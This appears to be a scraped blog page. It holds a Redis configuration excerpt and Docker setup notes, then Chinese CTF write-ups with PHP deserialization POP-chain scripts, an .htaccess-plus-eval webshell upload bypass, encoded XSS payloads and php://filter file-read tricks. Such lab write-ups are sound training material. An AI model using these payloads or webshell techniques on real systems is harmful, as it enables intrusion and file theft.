aof-use-rdb-preamble yes ################################ LUA SCRIPTING ############################### # Max execution time of a Lua script in milliseconds. # # If the maximum execution time is reached Redis will log that a script is # still in execution after the maximum allowed time and will start to # reply to queries with an error. # # When a long running script exceeds the maximum execution time only the # SCRIPT KILL and SHUTDOWN NOSAVE commands are available. The first can be # used to stop a script that did not yet called write commands. The second # is the only way to shut down the server in the case a write command was # already issued by the script but the user doesn't want to wait for the natural # termination of the script. # # Set it to 0 or a negative value for unlimited execution without warnings. lua-time-limit 5000 ################################ REDIS CLUSTER ############################### # Normal Redis instances can't be part of a Redis Cluster; only nodes that are # started as cluster nodes can. In order to start a Redis instance as a # cluster node enable the cluster support uncommenting the following: # # cluster-enabled yes # Every cluster node has a cluster configuration file. This file is not # intended to be edited by hand. It is created and updated by Redis nodes. # Every Redis Cluster node requires a different cluster configuration file. # Make sure that instances running in the same system do not have # overlapping cluster configuration file names. # # cluster-config-file nodes-6379.conf # Cluster node timeout is the amount of milliseconds a node must be unreachable # for it to be considered in failure state. # Most other internal time limits are multiple of the node timeout. # # cluster-node-timeout 15000 # A replica of a failing master will avoid to start a failover if its data # looks too old. # # There is no simple way for a replica to actually have an exact measure of # its \"data age\", so the following two checks are performed: # # 1) If there are multiple replicas able to failover, they exchange messages # in order to try to give an advantage to the replica with the best # replication offset (more data from the master processed). # Replicas will try to get their rank by offset, and apply to the start # of the failover a delay proportional to their rank. # # 2) Every single replica computes the time of the last interaction with # its master. This can be the last ping or command received (if the master # is still in the \"connected\" state), or the time that elapsed since the # disconnection with the master (if the replication link is currently down). # If the last interaction is too old, the replica will not try to failover # at all. # # The point \"2\" can be tuned by user. Specifically a replica will not perform # the failover if, since the last interaction with the master, the time # elapsed is greater than: # # (node-timeout * replica-validity-factor) + repl-ping-replica-period # # So for example if node-timeout is 30 seconds, and the replica-validity-factor # is 10, and assuming a default repl-ping-replica-period of 10 seconds, the # replica will not try to failover if it was not able to talk with the master # for longer than 310 seconds. # # A large replica-validity-factor may allow replicas with too old data to failover # a master, while a too small value may prevent the cluster from being able to # elect a replica at all. # # For maximum availability, it is possible to set the replica-validity-factor # to a value of 0, which means, that replicas will always try to failover the # master regardless of the last time they interacted with the master. # (However they'll always try to apply a delay proportional to their # offset rank). # # Zero is the only value able to guarantee that when all the partitions heal # the cluster will always be able to continue. # # cluster-replica-validity-factor 10 # Cluster replicas are able to migrate to orphaned masters, that are masters # that are left without working replicas. This improves the cluster ability # to resist to failures as otherwise an orphaned master can't be failed over # in case of failure if it has no working replicas. # # Replicas migrate to orphaned masters only if there are still at least a # given number of other working replicas for their old master. This number # is the \"migration barrier\". A migration barrier of 1 means that a replica # will migrate only if there is at least 1 other working replica for its master # and so forth. It usually reflects the number of replicas you want for every # master in your cluster. # # Default is 1 (replicas migrate only if their masters remain with at least # one replica). To disable migration just set it to a very large value. # A value of 0 can be set but is useful only for debugging and dangerous # in production. # # cluster-migration-barrier 1 # By default Redis Cluster nodes stop accepting queries if they detect there # is at least an hash slot uncovered (no available node is serving it). # This way if the cluster is partially down (for example a range of hash slots # are no longer covered) all the cluster becomes, eventually, unavailable. # It automatically returns available as soon as all the slots are covered again. # # However sometimes you want the subset of the cluster which is working, # to continue to accept queries for the part of the key space that is still # covered. In order to do so, just set the cluster-require-full-coverage # option to no. # # cluster-require-full-coverage yes # This option, when set to yes, prevents replicas from trying to failover its # master during master failures. However the master can still perform a # manual failover, if forced to do so. # # This is useful in different scenarios, especially in the case of multiple # data center operations, where we want one side to never be promoted if not # in the case of a total DC failure. # # cluster-replica-no-failover no # In order to setup your cluster make sure to read the documentation # available at http://redis.io web site. ########################## CLUSTER DOCKER/NAT support ######################## # In certain deployments, Redis Cluster nodes address discovery fails, because # addresses are NAT-ted or because ports are forwarded (the typical case is # Docker and other containers). # # In order to make Redis Cluster working in such environments, a static # configuration where each node knows its public address is needed. The # following two options are used for this scope, and are: # # * cluster-announce-ip # * cluster-announce-port # * cluster-announce-bus-port # # Each instruct the node about its address, client port, and cluster message # bus port. The information is then published in the header of the bus packets # so that other nodes will be able to correctly map the address of the node # publishing the information. # # If the above options are not used, the normal Redis Cluster auto-detection # will be used instead. # # Note that when remapped, the bus port may not be at the fixed offset of # clients port + 10000, so you can specify any port and bus-port depending # on how they get remapped. If the bus-port is not set, a fixed offset of # 10000 will be used as usually. # # Example: # # cluster-announce-ip 10.1.1.5 # cluster-announce-port 6379 # cluster-announce-bus-port 6380 ################################## SLOW LOG ################################### # The Redis Slow Log is a system to log queries that exceeded a specified # execution time. The execution time does not include the I/O operations # like talking with the client, sending the reply and so forth, # but just the time needed to actually execute the command (this is the only # stage of command execution where the thread is blocked and can not serve # other requests in the meantime). # # You can configure the slow log with two parameters: one tells Redis # what is the execution time, in microseconds, to exceed in order for the # command to get logged, and the other parameter is the length of the # slow log. When a new command is logged the oldest one is removed from the # queue of logged commands. # The following time is expressed in microseconds, so 1000000 is equivalent # to one second. Note that a negative number disables the slow log, while # a value of zero forces the logging of every command. slowlog-log-slower-than 10000 # There is no limit to this length. Just be aware that it will consume memory. # You can reclaim memory used by the slow log with SLOWLOG RESET. slowlog-max-len 128 ################################ LATENCY MONITOR ############################## # The Redis latency monitoring subsystem samples different operations # at runtime in order to collect data related to possible sources of # latency of a Redis instance. # # Via the LATENCY command this information is available to the user that can # print graphs and obtain reports. # # The system only logs operations that were performed in a time equal or # greater than the amount of milliseconds specified via the # latency-monitor-threshold configuration directive. When its value is set # to zero, the latency monitor is turned off. # # By default latency monitoring is disabled since it is mostly not needed # if you don't have latency issues, and collecting data has a performance # impact, that while very small, can be measured under big load. Latency # monitoring can easily be enabled at runtime using the command # \"CONFIG SET latency-monitor-threshold &lt;milliseconds&gt;\" if needed. latency-monitor-threshold 0 ############################# EVENT NOTIFICATION ############################## # Redis can notify Pub/Sub clients about events happening in the key space. # This feature is documented at http://redis.io/topics/notifications # # For instance if keyspace events notification is enabled, and a client # performs a DEL operation on key \"foo\" stored in the Database 0, two # messages will be published via Pub/Sub: # # PUBLISH __keyspace@0__:foo del # PUBLISH __keyevent@0__:del foo # # It is possible to select the events that Redis will notify among a set # of classes. Every class is identified by a single character: # # K Keyspace events, published with __keyspace@&lt;db&gt;__ prefix. # E Keyevent events, published with __keyevent@&lt;db&gt;__ prefix. # g Generic commands (non-type specific) like DEL, EXPIRE, RENAME, ... # $ String commands # l List commands # s Set commands # h Hash commands # z Sorted set commands # x Expired events (events generated every time a key expires) # e Evicted events (events generated when a key is evicted for maxmemory) # A Alias for g$lshzxe, so that the \"AKE\" string means all the events. # # The \"notify-keyspace-events\" takes as argument a string that is composed # of zero or multiple characters. The empty string means that notifications # are disabled. # # Example: to enable list and generic events, from the point of view of the # event name, use: # # notify-keyspace-events Elg # # Example 2: to get the stream of the expired keys subscribing to channel # name __keyevent@0__:expired use: # notify-keyspace-events Ex # # By default all notifications are disabled because most users don't need # this feature and the feature has some overhead. Note that if you don't # specify at least one of K or E, no events will be delivered. #notify-keyspace-events \"\" ############################### ADVANCED CONFIG ############################### # Hashes are encoded using a memory efficient data structure when they have a # small number of entries, and the biggest entry does not exceed a given # threshold. These thresholds can be configured using the following directives. hash-max-ziplist-entries 512 hash-max-ziplist-value 64 # Lists are also encoded in a special way to save a lot of space. # The number of entries allowed per internal list node can be specified # as a fixed maximum size or a maximum number of elements. # For a fixed maximum size, use -5 through -1, meaning: # -5: max size: 64 Kb &lt;-- not recommended for normal workloads # -4: max size: 32 Kb &lt;-- not recommended # -3: max size: 16 Kb &lt;-- probably not recommended # -2: max size: 8 Kb &lt;-- good # -1: max size: 4 Kb &lt;-- good # Positive numbers mean store up to _exactly_ that number of elements # per list node. # The highest performing option is usually -2 (8 Kb size) or -1 (4 Kb size), # but if your use case is unique, adjust the settings as necessary. list-max-ziplist-size -2 # Lists may also be compressed. # Compress depth is the number of quicklist ziplist nodes from *each* side of # the list to *exclude* from compression. The head and tail of the list # are always uncompressed for fast push/pop operations. Settings are: # 0: disable all list compression # 1: depth 1 means \"don't start compressing until after 1 node into the list, # going from either the head or tail\" # So: [head]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[tail] # [head], [tail] will always be uncompressed; inner nodes will compress. # 2: [head]-&gt;[next]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[prev]-&gt;[tail] # 2 here means: don't compress head or head-&gt;next or tail-&gt;prev or tail, # but compress all nodes between them. # 3: [head]-&gt;[next]-&gt;[next]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[prev]-&gt;[prev]-&gt;[tail] # etc. list-compress-depth 0 # Sets have a special encoding in just one case: when a set is composed # of just strings that happen to be integers in radix 10 in the range # of 64 bit signed integers. # The following configuration setting sets the limit in the size of the # set in order to use this special memory saving encoding. set-max-intset-entries 512 # Similarly to hashes and lists, sorted sets are also specially encoded in # order to save a lot of space. This encoding is only used when the length and # elements of a sorted set are below the following limits: zset-max-ziplist-entries 128 zset-max-ziplist-value 64 # HyperLogLog sparse representation bytes limit. The limit includes the # 16 bytes header. When an HyperLogLog using the sparse representation crosses # this limit, it is converted into the dense representation. # # A value greater than 16000 is totally useless, since at that point the # dense representation is more memory efficient. # # The suggested value is ~ 3000 in order to have the benefits of # the space efficient encoding without slowing down too much PFADD, # which is O(N) with the sparse encoding. The value can be raised to # ~ 10000 when CPU is not a concern, but space is, and the data set is # composed of many HyperLogLogs with cardinality in the 0 - 15000 range. hll-sparse-max-bytes 3000 # Streams macro node max size / items. The stream data structure is a radix # tree of big nodes that encode multiple items inside. Using this configuration # it is possible to configure how big a single node can be in bytes, and the # maximum number of items it may contain before switching to a new node when # appending new stream entries. If any of the following settings are set to # zero, the limit is ignored, so for instance it is possible to set just a # max entires limit by setting max-bytes to 0 and max-entries to the desired # value. stream-node-max-bytes 4096 stream-node-max-entries 100 # Active rehashing uses 1 millisecond every 100 milliseconds of CPU time in # order to help rehashing the main Redis hash table (the one mapping top-level # keys to values). The hash table implementation Redis uses (see dict.c) # performs a lazy rehashing: the more operation you run into a hash table # that is rehashing, the more rehashing \"steps\" are performed, so if the # server is idle the rehashing is never complete and some more memory is used # by the hash table. # # The default is to use this millisecond 10 times every second in order to # actively rehash the main dictionaries, freeing memory when possible. # # If unsure: # use \"activerehashing no\" if you have hard latency requirements and it is # not a good thing in your environment that Redis can reply from time to time # to queries with 2 milliseconds delay. # # use \"activerehashing yes\" if you don't have such hard requirements but # want to free memory asap when possible. activerehashing yes # The client output buffer limits can be used to force disconnection of clients # that are not reading data from the server fast enough for some reason (a # common reason is that a Pub/Sub client can't consume messages as fast as the # publisher can produce them). # # The limit can be set differently for the three different classes of clients: # # normal -&gt; normal clients including MONITOR clients # replica -&gt; replica clients # pubsub -&gt; clients subscribed to at least one pubsub channel or pattern # # The syntax of every client-output-buffer-limit directive is the following: # # client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt; # # A client is immediately disconnected once the hard limit is reached, or if # the soft limit is reached and remains reached for the specified number of # seconds (continuously). # So for instance if the hard limit is 32 megabytes and the soft limit is # 16 megabytes / 10 seconds, the client will get disconnected immediately # if the size of the output buffers reach 32 megabytes, but will also get # disconnected if the client reaches 16 megabytes and continuously overcomes # the limit for 10 seconds. # # By default normal clients are not limited because they don't receive data # without asking (in a push way), but just after a request, so only # asynchronous clients may create a scenario where data is requested faster # than it can read. # # Instead there is a default limit for pubsub and replica clients, since # subscribers and replicas receive data in a push fashion. # # Both the hard or the soft limit can be disabled by setting them to zero. client-output-buffer-limit normal 0 0 0 client-output-buffer-limit replica 256mb 64mb 60 client-output-buffer-limit pubsub 32mb 8mb 60 # Client query buffers accumulate new commands. They are limited to a fixed # amount by default in order to avoid that a protocol desynchronization (for # instance due to a bug in the client) will lead to unbound memory usage in # the query buffer. However you can configure it here if you have very special # needs, such us huge multi/exec requests or alike. # # client-query-buffer-limit 1gb # In the Redis protocol, bulk requests, that are, elements representing single # strings, are normally limited ot 512 mb. However you can change this limit # here. # # proto-max-bulk-len 512mb # Redis calls an internal function to perform many background tasks, like # closing connections of clients in timeout, purging expired keys that are # never requested, and so forth. # # Not all tasks are performed with the same frequency, but Redis checks for # tasks to perform according to the specified \"hz\" value. # # By default \"hz\" is set to 10. Raising the value will use more CPU when # Redis is idle, but at the same time will make Redis more responsive when # there are many keys expiring at the same time, and timeouts may be # handled with more precision. # # The range is between 1 and 500, however a value over 100 is usually not # a good idea. Most users should use the default of 10 and raise this up to # 100 only in environments where very low latency is required. hz 10 # Normally it is useful to have an HZ value which is proportional to the # number of clients connected. This is useful in order, for instance, to # avoid too many clients are processed for each background task invocation # in order to avoid latency spikes. # # Since the default HZ value by default is conservatively set to 10, Redis # offers, and enables by default, the ability to use an adaptive HZ value # which will temporary raise when there are many connected clients. # # When dynamic HZ is enabled, the actual configured HZ will be used as # as a baseline, but multiples of the configured HZ value will be actually # used as needed once more clients are connected. In this way an idle # instance will use very little CPU time while a busy instance will be # more responsive. dynamic-hz yes # When a child rewrites the AOF file, if the following option is enabled # the file will be fsync-ed every 32 MB of data generated. This is useful # in order to commit the file to the disk more incrementally and avoid # big latency spikes. aof-rewrite-incremental-fsync yes # When redis saves RDB file, if the following option is enabled # the file will be fsync-ed every 32 MB of data generated. This is useful # in order to commit the file to the disk more incrementally and avoid # big latency spikes. rdb-save-incremental-fsync yes # Redis LFU eviction (see maxmemory setting) can be tuned. However it is a good # idea to start with the default settings and only change them after investigating # how to improve the performances and how the keys LFU change over time, which # is possible to inspect via the OBJECT FREQ command. # # There are two tunable parameters in the Redis LFU implementation: the # counter logarithm factor and the counter decay time. It is important to # understand what the two parameters mean before changing them. # # The LFU counter is just 8 bits per key, it's maximum value is 255, so Redis # uses a probabilistic increment with logarithmic behavior. Given the value # of the old counter, when a key is accessed, the counter is incremented in # this way: # # 1. A random number R between 0 and 1 is extracted. # 2. A probability P is calculated as 1/(old_value*lfu_log_factor+1). # 3. The counter is incremented only if R &lt; P. # # The default lfu-log-factor is 10. This is a table of how the frequency # counter changes with a different number of accesses with different # logarithmic factors: # # +--------+------------+------------+------------+------------+------------+ # | factor | 100 hits | 1000 hits | 100K hits | 1M hits | 10M hits | # +--------+------------+------------+------------+------------+------------+ # | 0 | 104 | 255 | 255 | 255 | 255 | # +--------+------------+------------+------------+------------+------------+ # | 1 | 18 | 49 | 255 | 255 | 255 | # +--------+------------+------------+------------+------------+------------+ # | 10 | 10 | 18 | 142 | 255 | 255 | # +--------+------------+------------+------------+------------+------------+ # | 100 | 8 | 11 | 49 | 143 | 255 | # +--------+------------+------------+------------+------------+------------+ # # NOTE: The above table was obtained by running the following commands: # # redis-benchmark -n 1000000 incr foo # redis-cli object freq foo # # NOTE 2: The counter initial value is 5 in order to give new objects a chance # to accumulate hits. # # The counter decay time is the time, in minutes, that must elapse in order # for the key counter to be divided by two (or decremented if it has a value # less &lt;= 10). # # The default value for the lfu-decay-time is 1. A Special value of 0 means to # decay the counter every time it happens to be scanned. # # lfu-log-factor 10 # lfu-decay-time 1 ########################### ACTIVE DEFRAGMENTATION ####################### # # WARNING THIS FEATURE IS EXPERIMENTAL. However it was stress tested # even in production and manually tested by multiple engineers for some # time. # # What is active defragmentation? # ------------------------------- # # Active (online) defragmentation allows a Redis server to compact the # spaces left between small allocations and deallocations of data in memory, # thus allowing to reclaim back memory. # # Fragmentation is a natural process that happens with every allocator (but # less so with Jemalloc, fortunately) and certain workloads. Normally a server # restart is needed in order to lower the fragmentation, or at least to flush # away all the data and create it again. However thanks to this feature # implemented by Oran Agra for Redis 4.0 this process can happen at runtime # in an \"hot\" way, while the server is running. # # Basically when the fragmentation is over a certain level (see the # configuration options below) Redis will start to create new copies of the # values in contiguous memory regions by exploiting certain specific Jemalloc # features (in order to understand if an allocation is causing fragmentation # and to allocate it in a better place), and at the same time, will release the # old copies of the data. This process, repeated incrementally for all the keys # will cause the fragmentation to drop back to normal values. # # Important things to understand: # # 1. This feature is disabled by default, and only works if you compiled Redis # to use the copy of Jemalloc we ship with the source code of Redis. # This is the default with Linux builds. # # 2. You never need to enable this feature if you don't have fragmentation # issues. # # 3. Once you experience fragmentation, you can enable this feature when # needed with the command \"CONFIG SET activedefrag yes\". # # The configuration parameters are able to fine tune the behavior of the # defragmentation process. If you are not sure about what they mean it is # a good idea to leave the defaults untouched. # Enabled active defragmentation # activedefrag yes # Minimum amount of fragmentation waste to start active defrag # active-defrag-ignore-bytes 100mb # Minimum percentage of fragmentation to start active defrag # active-defrag-threshold-lower 10 # Maximum percentage of fragmentation at which we use maximum effort # active-defrag-threshold-upper 100 # Minimal effort for defrag in CPU percentage # active-defrag-cycle-min 5 # Maximal effort for defrag in CPU percentage # active-defrag-cycle-max 75 # Maximum number of set/hash/zset/list fields that will be processed from # the main dictionary scan # active-defrag-max-scan-fields 1000 使用redis6.0.8镜像创建容器(也叫运行镜像) docker run -p 6379:6379 --name myr3 --privileged=true -v /app/redis/redis.conf:/etc/redis/redis.conf -v /app/redis/data:/data -d redis:6.0.8 redis-server /etc/redis/redis.conf 测试redis-cli连接上来 docker exec -it 运行着Rediis服务的容器ID redis-cli 请证明docker启动使用了我们自己指定的配置文件 修改前 我们用的配置文件，数据库默认是16个 修改后 宿主机的修改会同步给docker容器里面的配置。记得重启服务 测试redis-cli连接上来第2次 8.5 安装Nginx 见高级篇Portainer","tags":["基本知识"],"categories":["Docker"]},{"title":"内部竞赛1","path":"/2023/08/06/nei-bu-jing-sai-ti-1/","content":"0x01 web1 打开题目，没什么发现，随后用dirsearch扫目录，可以发现存在robots.txt，访问该文件发现如下PHP文件 访问该文件发现源码 审计发现利用PHP特性 令a=a通过PHP会将其判断为数字0，成功绕过 key1与key2的sha1碰撞可以用数组绕过 最后的code利用变量替换?code=eval($_GET[1]);&amp;1=echo tac flag.php ;可以绕过对code的正则 0x02 web2 直接bp抓包进行验证 如图限制了php后缀名文件 修改为jpg后，发现如图 那我们需要修改content类型看看 绕过之后还是不行，那么他应该是检测了文件内容参考了佬的文章发现：这里的PHP版本为： PHP/5.6.23 ，可以使用 eval($_POST[‘bcx’]); 绕过那么文件名这里可以.htaccess文件将别的后缀名文件内容解析为php程序 AddType application/x-httpd-php .bcx 然后上传shell 然后上传shell访问上传路径发现禁用了如上图所示的函数，估计禁了很多，那么我们用目录浏览函数试试 成功看到flag，访问一下，当然这里也可以蚁剑连接更简便 0x03 web3 简单的反序列化 先上几个魔法函数 __construct()//当一个对象创建时被调用 __toString() //当一个对象被当作一个字符串使用 __wakeup()//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过) __get()//读取不可访问属性的值时调用 __invoke()//当尝试以调用函数的方式调用一个对象时，__invoke()方法会被自动调用 先找关键函数发现include函数，而调用该函数需要调用ikun函数，这样我们需要触发invoke函数才可以触发invoke需要当类对象被当做函数调用时触发，那么很明显可以看到try_this类中的function参数，即将aaa赋值为getflag即可。 值得注意的是aaa所在的方法中存在get魔术方法，而当我们访问一个类中不存在的属性时，才能触发该方法，因此转到lanqiu类中。 接下来看lanqiu类，其中wakeup方法没多大用处，只是对source做了一个限制，注意其中的tostring方法，与echo配合即可调用，这时将kun赋值为trythis，source赋值为lanqiu，即可成功调用get方法。 最后将eval赋值为 $eval=“php://filter/read=convert.base64-encode/resource=flag.php”;成功读取到flag文件 pop链如下 &lt;?php class get_flag { protected $eval=\"php://filter/read=convert.base64- encode/resource=flag.php\"; } class lanqiu{ public $source; public $kun; public function __construct(){ $this-&gt;kun = new Try_this(); } } class Try_this{ public $aaa; } $a = new lanqiu(); $a-&gt;source = new lanqiu(); $a-&gt;source-&gt;kun-&gt;aaa= new get_flag(); echo urlencode(serialize($a)); ?&gt; base64解码即可","categories":["内部竞赛"]},{"title":"内部竞赛2","path":"/2023/08/06/nei-bu-jing-sai-ti-2/","content":"0x01 easy-serialize 首先进入页面看到如下提示，源代码也没啥信息，就猜测是扫网站的意思，惯性思维直接访问robots.txt，找到php文件 访问开始审代码 &lt;?php class Demo { private $file = 'index.php'; public function __construct($file) { $this-&gt;file = $file; } function __destruct() { @highlight_file($this-&gt;file); } function __wakeup() { if ($this-&gt;file != 'index.php') { // the ikun is in the fl00000g.php $this-&gt;file = 'index.php'; } } } if (isset($_GET['ikun'])) { $kunkun = base64_decode($_GET['ikun']); if (preg_match('/[oc]:\\d+:/i', $kunkun)) { die ('stop Small spot!!!'); } else { @unserialize($kunkun); } } else { highlight_file(\"This_isnot_ikun.php\"); } ?&gt; 思路很清晰：首先是对ikun参数的过滤，符合条件则开始反序列化，这里看到敏感函数highlight_file，作用是可以高亮指定文件，前提是第二个参数为true，那很明显我们要令file=fl00000g.php，但有一点要注意：开始反序列化的时候会自动调用wakeup魔术方法，而该方法会扰乱我们对file的赋值，因此我们需要绕过该方法 首先在正则匹配那里，我们可以化为O:+数字来绕过，其次在wakeup中，我们只需要修改该类的属性个数不等于真实个数即可绕过，最后记得base64编码。 链子如下： &lt;?php class Demo { private $file = 'index.php'; public function __construct($file) { //$this-&gt;file = $file; } function __destruct() { //echo @highlight_file($this-&gt;file, true); } function __wakeup() { } } $a= new Demo('fl00000g.php'); $poc=serialize($a); $poc=str_replace('O:4', 'O:+4',$poc); $poc=str_replace(':1:', ':2:',$poc); echo $poc; $poc = (base64_encode($poc)); echo $poc; ?&gt; 值得注意的是，这里PHP版本为5.4，因此要注意该类变量中的private属性，而private属性被序列化的时候属性值会变成**%00类名%00属性名** 因此我们base64编码的时候用自带的函数，不然会导致丢失这些不可见字符 base64解码即可 0x02 111 依旧是反序列化，开始审，虽然有点长，但思路清晰 &lt;?php include(\"flag.php\"); highlight_file(__FILE__); class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = \"1\"; $filename = \"/tmp/tmpfile\"; $content = \"Hello World!\"; $this-&gt;process(); } public function process() { if($this-&gt;op == \"1\") { $this-&gt;write(); } else if($this-&gt;op == \"2\") { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(\"Bad Hacker!\"); } } private function write() { if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) { if(strlen((string)$this-&gt;content) &gt; 100) { $this-&gt;output(\"Too long!\"); die(); } $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(\"Successful!\"); else $this-&gt;output(\"Failed!\"); } else { $this-&gt;output(\"Failed!\"); } } private function read() { $res = \"\"; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename); } return $res; } private function output($s) { echo \"[Result]: &lt;br&gt;\"; echo $s; } function __destruct() { if($this-&gt;op === \"2\") $this-&gt;op = \"1\"; $this-&gt;content = \"\"; $this-&gt;process(); } } function is_valid($s) { for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true; } if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); } } 我们看到敏感函数file_get_contents，该函数会读取文件，因此很明显我们令filename=flag.php即可，那么我们又看到一个敏感函数file_put_contents，该函数会将指定内容写入指定文件，不出所料我们应该绕过此函数（write），因为函数对我们读取php文件没有丝毫帮助。 因此我们需要将op赋值为2进入read函数，最后由output输出内容 但在__destruct()方法中对op进行了强比较，而对比着看到process函数中对op有一个弱比较，因此我们令op等于数字2即可绕过，这样在前者由于类型不同返回true，后者则返回true 而在is_valid函数中，对我们的反序列化内容的ascii码进行了判断，其实这是在针对protected属性，因为这在序列化会出现不可见字符，那我们可以在编写poc时，将其改为public即可绕过。 poc如下 &lt;?php class FileHandler { public $op; public $filename; public $content; function __construct() { $this-&gt;process(); } public function process() { } private function write() { } private function read() { } private function output($s) { } function __destruct() { } } function is_valid($s) { } $poc=new FileHandler(); $poc-&gt;op = 2; $poc-&gt;filename = \"flag.php\"; echo serialize($poc); ?&gt; 得到flag 0x03 a_bad_day 进入页面发现如上，随便点两下看看 看到url出现get传参，猜测是文件包含，那我们直接尝试伪协议读取源代码 发现报错，这时没啥思路了，因为没怎么深究这种题过，因此上网搜寻发现，将php后缀去掉似乎可以 成功取得源码 &lt;?php $file = $_GET['category']; if(isset($file)) { if( strpos( $file, \"woofers\" ) !== false || strpos( $file, \"meowers\" ) !== false || strpos( $file, \"index\")){ include ($file . '.php'); } else{ echo \"Sorry, we currently only support woofers and meowers.\"; } } ?&gt; 看到如上php代码，发现一定要包含woofers，meowers，index中的某一个 这里又长知识了，可以利用伪协议的嵌套 伪协议的嵌套实际上就是过滤器的嵌套 所以可以构造php://filter/read=convert.base64-encode/meowers/resource=flag 解码即可 0x04 web1 先查看源代码 发现只要成功弹窗即可回显flag，那我们直接输入alert(1)测试一下 发现过滤了script,以及&lt;&gt;符号，继续测试发现对on，src，双引号等都有所过滤，脑袋疼，但同时也发现在value处的过滤似乎少，我们可以尝试一下，尝试一番过后依旧不太行。 思索一番过后发现利用 JavaScript 伪协议绕过是最简洁的，但没想到也对JavaScript进行了过滤，思考了一阵儿，这时候看了笔记想到可以编码，那我们unicode编码看看 payload如下：\"javascript:alert(1) 编码后：&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41; 输入之后成功弹窗 得到flag 0x05 web2 进去之后是有趣的小游戏，查看源代码也没啥有用信息，那我们直接F12看js源码 if(b.x==bucket_one.x||b.x==bucket_two.x||b.x==bucket_three.x||b.x==bucket_four.x||b.x==bucket_five.x) { flag=true; } if(flag==true) { score++; } flag=false; defen(score); if(b.y&gt;600||b.y&lt;0) { game_over=true; } if(game_over==false) { requestAnimationFrame(run); }else { if(score&gt;100) { var result=window.confirm(\"\\u4f60\\u8d62\\u4e86\\uff0c\\u53bb\\u5e7a\\u5e7a\\u96f6\\u70b9\\u76ae\\u7231\\u5403\\u76ae\\u770b\\u770b\"); } else { var result=window.confirm(\"GAMEOVER 是否重新开始？\"); 审到这里发现重要信息，发现分数大于100会有弹窗，看内容很明显是unicode编码，我们解码看看 发现要访问110.php 访问发现一个很简单的PHP特性 &lt;?php include 'flag.php'; highlight_file(__FILE__); $flag='flag{xxxxxxxxxxxxxxxxxxxxxxxxx}'; if(isset($_GET['gg'])&amp;&amp;isset($_GET['id'])) { $id=$_GET['id']; $gg=$_GET['gg']; if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) { echo 'You got the first step'; if(isset($_POST['passwd'])) { $passwd=$_POST['passwd']; if (!is_numeric($passwd)) { if($passwd==123456) { echo 'Good Job!'; highlight_file('flag.php'); die('By Retr_0'); } else { echo \"can you think twice??\"; } } else{ echo 'You can not get it !'; } } else{ die('only one way to get the flag'); } } else { echo \"You are not a real hacker!\"; } } else{ die('Please input first'); } ?&gt; Please input first 这里不详细解释了，很简单，首先是简单的md5强碰撞绕过，令gg[]=1&amp;id[]=2，即可绕过，随后是一个is_numeric函数与弱比较的配合，我们令passwd=123456a即可绕过 成功得到flag 0x06 yuxss 查看源代码，发现四个隐藏元素 那我们可以进行测试看看哪个元素可以显示js代码，这里由于跟xss-lab很像，翻了翻看到这里有个get参数keyword，我们输入以下payload： ?keyword=&lt;script&gt;alert('xss')&lt;/script&gt;&amp;t_link=\" type=\"text\"&amp;t_history=\" type=\"text\"&amp;t_sort=\" type=\"text\"&amp;t_ref=\" type=\"text\" 发现在第三个元素可以回显，我们进行测试后，发现过滤的挺多的无从下手，接着翻文章以及这个t_cook值的特殊我们想到抓包修改cookie 发现user内容与cook内容是同步的，并且过滤也不多，那我们利用input标签闭合看看 payload：\" onclick=alert('xss') type=\"text 输入之后点击文本框即可成功弹窗 得到flag 0x07 babyupload 文件上传，直接bp抓包上去测试 简单测试发现，过滤了php后缀，文件type类型以及文件内容检测（检测是否有php标志） 由于和上次考核题目一致，这里可以用可以使用 eval($_POST[‘bcx’]); 绕过 因为PHP版本为5.6.23。其次这里需要利用.htaccess文件来让将别的后缀名文件内容解析为php程序 AddType application/x-httpd-php .bcx 步骤如下： 然后上传shell 访问shell 成功上传，这里我先用蚁剑连接 根目录成功找到flag 当然这里令bcx=var_dump(scandir(‘/’)); 然后bcx=var_dump(file_get_content(‘/flag’)); 0x08 0ctf 访问之后如下图 查看源代码没啥信息，那用dirsearch扫一下目录，结果发现www.zip，访问得到源码，开始审计 其中的html代码就不放了 1. index.php &lt;?php require_once('class.php'); if($_SESSION['username']) { header('Location: profile.php'); exit; } if($_POST['username'] &amp;&amp; $_POST['password']) { $username = $_POST['username']; $password = $_POST['password']; if(strlen($username) &lt; 3 or strlen($username) &gt; 16) die('Invalid user name'); if(strlen($password) &lt; 3 or strlen($password) &gt; 16) die('Invalid password'); if($user-&gt;login($username, $password)) { $_SESSION['username'] = $username; header('Location: profile.php'); exit; } else { die('Invalid user name or password'); } } else { ?&gt; 一个简单的登录页面，如果用户名密码正确，则跳转到profile.php页面 2. register.php &lt;?php require_once('class.php'); if($_POST['username'] &amp;&amp; $_POST['password']) { $username = $_POST['username']; $password = $_POST['password']; if(strlen($username) &lt; 3 or strlen($username) &gt; 16) die('Invalid user name'); if(strlen($password) &lt; 3 or strlen($password) &gt; 16) die('Invalid password'); if(!$user-&gt;is_exists($username)) { $user-&gt;register($username, $password); echo 'Register OK!&lt;a href=\"index.php\"&gt;Please Login&lt;/a&gt;'; } else { die('User name Already Exists'); } } else { ?&gt; 注册页面，也很简单，检查一下输入的用户名和密码，符合要求就连接数据库创建账户 3. update.php &lt;?php require_once('class.php'); if($_SESSION['username'] == null) { die('Login First'); } if($_POST['phone'] &amp;&amp; $_POST['email'] &amp;&amp; $_POST['nickname'] &amp;&amp; $_FILES['photo']) { $username = $_SESSION['username']; 